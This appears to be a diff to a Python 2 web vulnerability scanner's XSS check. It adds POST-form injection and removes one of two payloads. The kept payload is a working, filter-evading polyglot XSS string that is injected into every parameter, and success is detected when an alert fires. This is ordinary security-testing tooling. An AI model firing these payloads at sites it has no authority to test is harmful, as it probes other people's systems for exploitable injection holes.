@@ -6,21 +6,33 @@ import requests
 import datetime
 import re
 
-"""scan_xss /!\ TODO : POST request (check method, data)
+"""scan_xss 
 Description: inject a polyglot vector for XSS in every parameter, then it checks if an alert was triggered
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
 def scan_xss(method, vulns, url, fuzz, cookie, useragent, firefox, data):
 	payload = 'jaVasCript:alert(1)//" name=alert(1) onErrOr=eval(name) src=1 autofocus oNfoCus=eval(name)><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=prompt`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>confirm(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><!--'
-	payload1 = 'javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42\'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"'
-
+	print repr(fuzz),"fuzz"
 	try:	
 		with firefox.start() as session:
-		
-			# Send GET XSS
-			inject = url.replace(fuzz+"=", fuzz+"="+payload)
-			page, extra_resources = session.open(inject, headers={'Cookie':cookie}, user_agent=useragent)
-			result, resources = session.wait_for_alert(1)
+
+			# POST
+			if (method == 'POST' and fuzz != ''):
+				inject = dict(data)
+				inject[fuzz] = inject[fuzz] + payload 
+				del inject['']
+				page, extra_resources = session.open(url, headers={'Cookie':cookie}, user_agent=useragent)
+				result, resources     = session.fill("form", inject)
+				page, resources       = session.call("form", "submit", expect_loading=True)
+				result, resources     = session.wait_for_alert(1)
+				inject = url + ":" + fuzz + ":" + inject[fuzz]
+
+			# GET
+			if (method == 'GET'):
+				inject                = url.replace(fuzz+"=", fuzz+"="+payload)
+				page, extra_resources = session.open(inject, headers={'Cookie':cookie}, user_agent=useragent)
+				result, resources     = session.wait_for_alert(1)
+
 
 			# Detect XSS result with an alert
 			if result == '1':
@@ -31,7 +43,13 @@ def scan_xss(method, vulns, url, fuzz, cookie, useragent, firefox, data):
 				print "\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload
 
 	except Exception, e:
-		print "\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload
+		if "alert" in str(e):
+			print "\t\t\033[93mXSS Detected \033[0m for ", fuzz, " with the payload :", payload
+			inject = url + ":" + fuzz + ":" + payload
+			vulns['xss']  += 1
+			vulns['list'] += 'XSS|TYPE|'+inject+'|DELIMITER|'
+		else:
+			print "\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload
 
 
 """scan_sql
